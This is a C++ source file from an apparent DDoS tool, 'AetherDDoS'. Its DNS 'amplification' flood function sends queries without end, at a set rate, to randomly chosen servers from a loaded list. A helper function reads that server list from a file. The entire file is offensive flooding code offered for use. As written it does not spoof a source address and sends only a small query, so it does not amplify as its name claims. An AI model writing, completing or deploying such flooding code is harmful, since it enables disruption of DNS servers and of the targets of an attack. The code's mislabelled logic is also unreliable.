#include "aether_ddos.h"
#include <random>

void AetherDDoS::dns_amp_flood(int thread_id) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { log("[-] DNS Amp Socket failed: Thread " + std::to_string(thread_id)); return; }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, dns_servers.size() - 1);

    sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(53);
    
    while (true) {
        std::string dns_server = dns_servers[dist(gen)];
        inet_pton(AF_INET, dns_server.c_str(), &target_addr.sin_addr);
        char query[] = "\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01";
        sendto(sock, query, sizeof(query), 0, (sockaddr*)&target_addr, sizeof(target_addr));
        log("[*] DNS Amp Thread " + std::to_string(thread_id) + ": Query sent to " + dns_server);
        std::this_thread::sleep_for(std::chrono::microseconds(1000000 / rate_per_thread));
    }
    close(sock);
}

void AetherDDoS::load_dns_servers(const std::string& file) {
    std::ifstream infile(file);
    std::string line;
    while (std::getline(infile, line)) {
        dns_servers.push_back(line);
    }
    log("[*] LOADED " + std::to_string(dns_servers.size()) + " DNS SERVERS!");
}
